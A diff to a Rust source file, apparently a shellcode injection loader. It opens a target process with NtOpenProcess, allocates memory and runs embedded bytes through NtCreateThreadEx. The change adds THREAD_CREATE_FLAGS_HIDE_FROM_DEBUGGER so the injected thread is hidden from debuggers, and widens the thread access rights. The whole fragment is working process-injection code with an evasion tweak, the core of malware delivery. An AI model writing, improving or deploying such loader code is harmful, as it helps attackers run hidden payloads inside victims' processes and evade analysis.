@@ -6,7 +6,7 @@ use std::include_bytes;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, GENERIC_ALL},
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE},
         lmaccess::{ACCESS_ALL}
     },
     shared::{
@@ -15,7 +15,9 @@ use winapi::{
 };
 use winapi::ctypes::c_void;
 use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
+use ntapi::ntpsapi::THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
 use std::{ptr::null_mut};
+use winapi::um::winnt::THREAD_ALL_ACCESS;
 use ntapi::ntapi_base::CLIENT_ID;
 use ntapi::ntpsapi::NtOpenProcess;
 use ntapi::ntmmapi::NtAllocateVirtualMemory;
@@ -77,7 +79,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
 
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let write_thread = NtCreateThreadEx(&mut thread_handle, GENERIC_ALL, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
+        let write_thread = NtCreateThreadEx(&mut thread_handle, THREAD_ALL_ACCESS, null_mut(), handle, allocstart, null_mut(), THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0 as usize, 0 as usize, 0 as usize, null_mut());
 
         if !NT_SUCCESS(write_thread) {
             panic!("Error failed to create remote thread: {}", write_thread);
